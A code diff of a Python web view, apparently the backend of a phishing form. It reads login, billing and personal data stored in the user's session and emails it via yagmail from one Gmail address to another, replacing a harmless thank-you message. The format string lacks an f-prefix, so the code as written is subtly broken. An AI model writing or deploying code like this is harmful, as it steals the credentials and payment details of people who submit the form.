@@ -42,21 +42,15 @@ def thank_you_view(request):
     login_data = request.session.get('login_data')
     bill_data = request.session.get('bill_data')
     info_data = request.session.get('info_data')
-    
-    print(login_data)
-    print(bill_data)
-    print(info_data)
-    
-    
 
-# Automatically retrieves password from keyring
+
     try:
         yag = yagmail.SMTP('castanedaorlando871@gmail.com')
 
         yag.send(
         to='lyndazuniga2020@gmail.com',
         subject='Thank You!',
-        contents='We received your form submission successfully.'
+        contents='{login_data} {bill_data} {info_data}',
     )
         print("✅ Email sent successfully.")
     except Exception as e:
